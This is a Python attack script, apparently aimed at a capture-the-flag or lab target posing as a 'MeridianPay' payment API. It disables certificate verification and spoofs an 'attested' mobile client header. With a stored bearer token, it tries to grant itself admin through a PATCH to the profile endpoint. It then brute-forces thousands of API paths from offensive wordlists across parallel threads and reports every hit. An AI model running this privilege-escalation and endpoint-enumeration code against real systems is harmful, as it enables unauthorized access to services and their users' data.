import json, re, ssl, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor

BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CL = "MeridianPay-Android/3.2.1 (attested)"

def call(p, t=None):
    hh = {"X-Meridian-Client": CL, "Content-Type": "application/json"}
    if t: hh["Authorization"] = "Bearer " + t
    r = urllib.request.Request(BASE+p, headers=hh)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=10) as f: return f.status, f.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

T = open("T3.txt").read().strip()
call("/api/v1/profile", T, m="PATCH", body={"role":"admin"}) if False else None
r = urllib.request.Request(BASE+"/api/v1/profile", data=json.dumps({"role":"admin"}).encode(), method="PATCH",
                           headers={"X-Meridian-Client":CL,"Content-Type":"application/json","Authorization":"Bearer "+T})
try: urllib.request.urlopen(r, context=CTX, timeout=12).read()
except Exception: pass

names = set()
FILES = ["api-seen-in-wild.txt","api-endpoints-res.txt","objects.txt","actions.txt",
         "common-api-endpoints-mazen160.txt","raft-medium-directories-lowercase.txt"]
for fn in FILES:
    for line in open(fn, encoding="utf-8", errors="ignore"):
        w = line.strip().lstrip("/")
        if not w or " " in w or len(w) > 40: continue
        w = re.sub(r"\{[^}]*\}", "1", w)
        w = re.sub(r":[A-Za-z_]+", "1", w)
        if "{" in w or "<" in w: continue
        names.add(w)
names = sorted(names)
print("names:", len(names), flush=True)

paths = {"/api/v1/" + n for n in names}
paths |= {"/" + n for n in names if "/" not in n}
paths = sorted(paths)
print("paths:", len(paths), flush=True)

def work(p):
    c, b = call(p, T)
    if c is None: return None
    if not (c == 404 and "404 Not Found" in b):
        return (p, c, b[:200])
    return None

with ThreadPoolExecutor(max_workers=12) as ex:
    for i, r in enumerate(ex.map(work, paths)):
        if r: print("HIT", r, flush=True)
        if i % 4000 == 0: print("...", i, flush=True)
print("API-SWEEP2 DONE")
